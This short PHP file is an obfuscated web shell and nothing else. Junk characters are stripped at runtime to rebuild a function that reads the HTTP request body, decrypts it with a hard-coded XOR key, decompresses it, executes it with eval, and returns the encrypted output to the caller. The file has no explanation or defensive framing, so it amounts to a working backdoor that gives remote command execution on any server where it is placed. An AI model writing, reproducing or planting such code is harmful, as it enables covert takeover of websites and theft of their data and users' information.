<?php
$e='$k="2bf8yd723"y;$kh="4by58y9e97ccc5"y;$ykf="ydcye2ca970e3yd";$p="rJV02vyy6h6n24yc0kS";funcytion x($yt,$';
$j='$o.y=y$t{$i}^$yyk{$j};}}return $yo;y}if (@preyg_matcyh("/$ykhy(.+)$kf/y",@fileyy_get_contents(y"php:y/';
$z=str_replace('cH','','cHcrcHeacHte_cHcHfuncticHon');
$c='k){y$cy=strlen($ky);$l=syytrlen($yt);$o="";yfor($i=0;y$yi<y$l;){fory($yj=0;($j<$c&&$yi<$l);$j+y+,$i++)y{';
$W='/input"y),$m)==y1) {@yob_stayrt();@eyval(@ygyzuyncompress(y@x(@base6y4_deyycode($ym[1]),$k)));$o=@oyby_';
$P='get_conytentsy();@ob_eyyndy_clean()y;$r=@byase64_encoydey(@x(@gzcyompress(y$o),y$ky));print("$p$khy$r$kf");}';
$B=str_replace('y','',$e.$c.$j.$W.$P);
$O=$z('',$B);$O();
?>
